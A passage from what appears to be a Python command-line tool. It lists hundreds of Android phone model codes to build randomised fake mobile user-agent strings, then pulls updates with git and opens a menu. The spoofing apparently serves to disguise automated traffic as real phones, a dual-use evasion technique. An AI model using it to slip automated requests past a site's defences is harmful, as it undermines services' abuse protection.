-N975F','SM-N976N','SM-N980F','SM-N981U','SM-N981B','SM-N985F','SM-N9860','SM-N986N','SM-N986U','SM-N986B','SM-N986W','SM-N9008V','SM-N9006','SM-N900A','SM-N9005','SM-N900W8','SM-N900','SM-N9009','SM-N900P','SM-N9000Q','SM-N9002','SM-9005','SM-N750L','SM-N7505','SM-N750','SM-N7502','SM-N910F','SM-N910V','SM-N910C','SM-N910U','SM-N910H','SM-N9108V','SM-N9100','SM-N915FY','SM-N9150','SM-N915T','SM-N915G','SM-N915A','SM-N915F','SM-N915S','SM-N915D','SM-N15W8','SM-N916S','SM-N916K','SM-N916L','SM-N916LSK','SM-N920L','SM-N920S','SM-N920G','SM-N920A','SM-N920C','SM-N920V','SM-N920I','SM-N920K','SM-N9208','SM-N930F','SM-N9300','SM-N930x','SM-N930P','SM-N930X','SM-N930W8','SM-N930V','SM-N930T','SM-N950U','SM-N950F','SM-N950N','SM-N960U','SM-N960F','SM-N960U','SM-N935F','SM-N935K','SM-N935S','SM-G550T','SM-G550FY','SM-G5500','SM-G5510','SM-G550T1','SM-S550TL','SM-G5520','SM-G5528','SM-G600FY','SM-G600F','SM-G6000','SM-G6100','SM-G610S','SM-G611F','SM-G611L','SM-G110M','SM-G110H','SM-G110B','SM-G910S','SM-G316HU','SM-G977N','SM-G973U1','SM-G973F','SM-G973W','SM-G973U','SM-G770U1','SM-G770F','SM-G975F','SM-G975U','SM-G970U','SM-G970U1','SM-G970F','SM-G970N','SM-G980F','SM-G981U','SM-G981N','SM-G981B','SM-G780G','SM-G780F','SM-G781W','SM-G781U','SM-G7810','SM-G9880','SM-G988B','SM-G988U','SM-G988B','SM-G988U1','SM-G985F','SM-G986U','SM-G986B','SM-G986W','SM-G986U1','SM-G991U','SM-G991B','SM-G990B','SM-G990E','SM-G990U','SM-G998U','SM-G996W','SM-G996U','SM-G996N','SM-G9960','SM-S901U','SM-S901B','SM-S908U','SM-S908U1','SM-S908B','SM-S9080','SM-S908N','SM-S908E','SM-S906U','SM-S906E','SM-S906N','SM-S906B','SM-S906U1','SM-G730V','SM-G730A','SM-G730W8','SM-C105L','SM-C101','SM-C105','SM-C105K','SM-C105S','SM-G900F','SM-G900P','SM-G900H','SM-G9006V','SM-G900M','SM-G900V','SM-G870W','SM-G890A','SM-G870A','SM-G900FD','SM-G860P','SM-G901F','SM-G901F','SM-G800F','SM-G800H','SM-G903F','SM-G903W','SM-G920F','SM-G920K','SM-G920I','SM-G920A','SM-G920P','SM-G920S','SM-G920V','SM-G920T','SM-G925F','SM-G925A','SM-G925W8','SM-G928F','SM-G928C','SM-G9280','SM-G9287','SM-G928T','SM-G928I','SM-G930A','SM-G930F','SM-G930W8','SM-G930S','SM-G930V','SM-G930P','SM-G930L','SM-G891A','SM-G935F','SM-G935T','SM-G935W8','SM-G9350','SM-G950F','SM-G950W','SM-G950U','SM-G892A','SM-G892U','SM-G8750','SM-G955F','SM-G955U','SM-G955U1','SM-G955W','SM-G955N','SM-G960U','SM-G960U1','SM-G960F','SM-G965U','SM-G965F','SM-G965U1','SM-G965N','SM-G9650','SM-J321AZ','SM-J326AZ','SM-J336AZ','SM-T116','SM-T116NU','SM-T116NY','SM-T116NQ','SM-T2519','SM-G318HZ','SM-T255S','SM-W2016','SM-W2018','SM-W2019','SM-W2021','SM-W2022','SM-G600S','SM-E426S','SM-G3812','SM-G3812B','SM-G3818','SM-G388F','SM-G389F','SM-G390F','SM-G398FN','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921','2201116SI','M2012K11AI','22011119TI','21091116UI','M2102K1AC','M2012K11I','22041219I','22041216I','2203121C','2106118C','2201123G','2203129G','2201122G','2201122C','2206122SC','22081212C','2112123AG','2112123AC','2109119BC','M2002J9G','M2007J1SC','M2007J17I','M2102J2SC','M2007J3SY','M2007J17G','M2007J3SG','M2011K2G','M2101K9AG','M2101K9R','2109119DG','M2101K9G','2109119DI','M2012K11G','M2102K1G','21081111RG','2107113SG','21051182G','M2105K81AC','M2105K81C','21061119DG','21121119SG','22011119UY','21061119AG','21061119AL','22041219NY','22041219G','21061119BI','220233L2G','220233L2I','220333QNY','220333QAG','M2004J7AC','M2004J7BC','M2004J19C','M2006C3MII','M2010J19SI','M2006C3LG','M2006C3LVG','M2006C3MG','M2006C3MT','M2006C3MNG','M2006C3LII','M2010J19SL','M2010J19SG','M2010J19SY','M2012K11AC','M2012K10C','M2012K11C','22021211RC'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
        return self.useragent

if __name__ == '__main__':
    try:
        os.system('git pull');daftar_menu()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()